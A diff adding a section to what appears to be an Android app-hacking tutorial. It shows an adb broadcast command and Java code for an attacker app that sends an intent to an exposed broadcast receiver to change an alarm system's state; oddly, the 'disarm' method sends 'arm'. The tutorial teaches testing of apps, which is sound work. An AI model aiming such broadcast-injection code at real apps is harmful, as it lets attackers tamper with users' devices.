@@ -85,3 +85,36 @@ adb shell am broadcast -a com.apphacking.broadcastreceiver.alarmState -es "statu
 By following these steps, you can effectively send broadcasts using the Activity Manager in Android, whether you are working with older versions or the latest ones.
 
 <figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+
+### SO our Hacking App's **`MainActivity.java`** code&#x20;
+
+```java
+package com.apphacking.broadcasthacking;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+
+
+    public void disarmAlarmSystem(View view) {
+
+        Intent intent = new Intent();
+        intent.setAction("com.apphacking.broadcastreceiver.alarmState");
+        intent.putExtra("status","arm");
+        sendBroadcast(intent);
+    }
+
+
+}
+```
